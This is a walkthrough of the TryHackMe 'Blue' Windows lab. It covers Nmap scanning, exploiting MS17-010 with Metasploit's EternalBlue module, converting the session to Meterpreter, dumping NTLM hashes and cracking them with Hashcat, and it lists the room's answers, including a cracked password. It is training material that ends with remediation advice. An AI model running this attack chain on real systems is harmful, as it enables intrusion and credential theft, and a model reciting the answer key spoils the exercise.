# Blue: Complete TryHackMe Walkthrough

Official room: https://tryhackme.com/room/blue

## Room Overview & Information

**Difficulty:** Easy  
**Category:** Windows exploitation and post-exploitation  
**Primary vulnerability:** MS17-010 in SMB  
**Learning objectives:** TCP port enumeration, SMB vulnerability checking, Metasploit module selection, session conversion, NTLM hash recovery, locating Windows flags, and remediation.

This is a deliberately vulnerable Windows lab. Run every scan and exploit only against the machine deployed by the room. Replace `MACHINE_IP` with the current TryHackMe target address. Do not use an IP copied from an older run. The room's fixed flags are not reproduced below because I have not verified their exact values from the active instance; the paths and retrieval steps are included.

## Phase 1: Reconnaissance & Enumeration

### Task 1: Identify exposed ports

Start the machine and record its IP. Scan the first 1,000 TCP ports and save the output:

```bash
nmap -sC -sV -p 1-1000 -oN blue-ports-1000.txt MACHINE_IP
```

- `-sC` runs Nmap's default scripts.
- `-sV` probes open ports to identify service names and versions.
- `-p 1-1000` scans TCP ports numbered 1 through 1000. Do not use `-p 1000`, which scans only port 1000.
- `-oN` saves a readable report for later reference.

The documented room instance has **3 open ports below 1000**. Count only the ports reported as open in your own scan; ignore closed and filtered ports.

### Question: “How many ports are open with a port number under 1000?”

**Answer:** `3`.

### Task 2: Identify the SMB vulnerability

The important clue is Microsoft SMB on TCP 445. Check the port and the specific vulnerability in the authorized lab:

```bash
nmap -p 445 --script smb-vuln-ms17-010 -oN blue-smb-check.txt MACHINE_IP
```

- `-p 445` limits the scan to SMB's TCP port.
- `--script smb-vuln-ms17-010` runs the Nmap check for the MS17-010 vulnerability family.
- `-oN` saves the result.

The room identifies **MS17-010**, a set of Microsoft SMB security flaws associated with vulnerable Windows systems. The EternalBlue exploit is commonly associated with this vulnerability family. A scanner result should be checked against the service and target configuration; do not assume every SMB server is vulnerable.

### Question: “What is this machine vulnerable to? (Answer in the form of: ms??-???)”

**Answer:** `ms17-010`.

## Phase 2: Vulnerability Analysis & Initial Access

### Task 3: Find the correct Metasploit module

Start the Metasploit console:

```bash
msfconsole
```

Search for the room's vulnerability:

```text
search ms17_010
```

The intended EternalBlue module path is:

```text
exploit/windows/smb/ms17_010_eternalblue
```

Select it and inspect its requirements:

```text
use exploit/windows/smb/ms17_010_eternalblue
show options
info
```

The module path identifies an exploit module for a particular Windows SMB vulnerability. `show options` lists the required and optional settings; `info` describes the module and its prerequisites.

### Question: “Find the exploitation code we will run against the machine. What is the full path of the code?”

**Answer:** `exploit/windows/smb/ms17_010_eternalblue`.

### Task 4: Set the target option

The required target setting is `RHOSTS`, which means the remote host or hosts to test. In a one-machine lab, set it to the room's current IP:

```text
set RHOSTS MACHINE_IP
show options
```

Verify the displayed target before running the module. Some exploits have additional requirements and may fail even when the service appears vulnerable. The original room notes show that EternalBlue did not produce a working session in that run, while the related SMB PSEXEC module did. Use the module specified by the active room and do not repeatedly fire exploits without reviewing the errors.

### Question: “Show options and set the one required value. What is the name of this value? (All caps for submission)”

**Answer:** `RHOSTS`.

### Obtain a session

If the selected module creates a session, list sessions and verify the connection from inside the session. Do not claim a foothold simply because Metasploit reports that an exploit was sent. If the room directs the learner to use the PSEXEC variant, select the module indicated by the room and set all required target options from the current scan.

## Phase 3: Privilege Escalation & Post-Exploitation

### Task 5: Convert a shell session to Meterpreter

If the exploit provides a basic command shell and the room instructs you to convert it, background the active session using the Metasploit console's session control, then use the post module:

```text
use post/multi/manage/shell_to_meterpreter
show options
```

The module requires the `SESSION` option. Set it to the actual session number reported by Metasploit:

```text
set SESSION SESSION_ID
show options
run
sessions -l
```

Replace `SESSION_ID` with the session number from your current run. A session number is not a fixed value and can change every time the module runs.

### Question: “What is the name of the post module we will use?”

**Answer:** `post/multi/manage/shell_to_meterpreter`.

### Question: “Select this module and show options. What option are we required to change?”

**Answer:** `SESSION`.

### Task 6: Dump and crack the local password hash

In the elevated Meterpreter session, the room asks you to run `hashdump`. This reads Windows local account password hashes when the session has sufficient privileges:

```text
hashdump
```

The output uses a structure similar to:

```text
username:RID:LM_hash:NT_hash:::
```

The non-default user in the documented instance is `jon`. The NT hash is the field used for the room's cracking step. Save only the necessary hash in your lab workspace; do not publish a real user's password hash.

### Question: “What is the name of the non-default user?”

**Answer:** `jon`.

For an authorized lab hash, a Hashcat wordlist attack against an NTLM hash uses mode 1000:

```bash
hashcat -m 1000 -a 0 jon-ntlm.txt /path/to/rockyou.txt
hashcat -m 1000 --show jon-ntlm.txt
```

- `-m 1000` selects NTLM.
- `-a 0` selects a straight wordlist attack.
- The first file contains the NTLM hash in the format Hashcat expects.
- The wordlist supplies candidate passwords.
- `--show` prints recovered results already in the potfile.

The actual wordlist path may differ. On some AttackBox images, RockYou is compressed and must be made available before use. If the result is not recovered, confirm that you copied the NT hash rather than the LM hash and chose the correct mode.

### Question: “What is the cracked password?”

**Answer:** `alqfna22`.

This is a deliberately weak password from the lab; do not reuse it on any other system.

## Phase 4: Room Questions & Flags Walkthrough

### Task 7: Find all three flags

Use the room's flag prompts to locate the files. After obtaining the required privileges, enumerate the specified locations with the Meterpreter file commands or a Windows shell.

**Flag 1:** The task says it is located at the system root. In the standard Windows target, inspect the root of the system drive:

```text
cd C:\
dir
type C:\flag1.txt
```

If the filename is not exactly `flag1.txt`, use the room's hint and the live directory listing. Do not guess a flag value from another walkthrough.

**Flag 2:** The clue points to the Windows location where local password and security configuration data are stored. Inspect the task's specified directory:

```text
dir C:\Windows\System32\config
type C:\Windows\System32\config\flag2.txt
```

The SAM and SYSTEM registry hive files are normally in this directory. The room's flag file is a separate lab artifact; do not confuse it with a registry hive.

**Flag 3:** The hint points to the administrator's personal files. The documented path is:

```text
dir C:\Users\Jon\Documents
type C:\Users\Jon\Documents\flag3.txt
```

Copy each value exactly from the live machine. The repository should not contain invented or unverified flag strings.

### Questions and answers summary

| Question | Answer |
|---|---|
| How many ports are open under 1000? | `3` |
| What is the machine vulnerable to? | `ms17-010` |
| Full path of the exploit module? | `exploit/windows/smb/ms17_010_eternalblue` |
| Required target value in module options? | `RHOSTS` |
| Name of the shell-to-Meterpreter post module? | `post/multi/manage/shell_to_meterpreter` |
| Required option for the post module? | `SESSION` |
| Name of the non-default user? | `jon` |
| Cracked password? | `alqfna22` |
| Flag 1, flag 2, flag 3? | Read each from the current lab paths above; values not independently verified here. |

## Phase 5: Key Takeaways & Remediation

- Patch Windows systems for MS17-010 and retire unsupported Windows versions.
- Disable SMBv1 where it is not required and restrict SMB exposure with firewalls and segmentation.
- Use vulnerability checks to corroborate service enumeration before exploitation.
- Run exploit modules only against the authorized target and verify each session and privilege change.
- Use long unique passwords and monitor local-account password reuse.
- Protect local administrator accounts, limit remote administrative access, and enable security logging.
- Treat password hashes and flags as sensitive lab output; keep them out of public write-ups unless the intended policy allows publication.

The room demonstrates a common attack chain: enumerate SMB, identify an unpatched vulnerability, obtain a session, recover local credential material, crack a weak password, and verify the three requested files. Each step should be backed by the current lab's observable evidence.
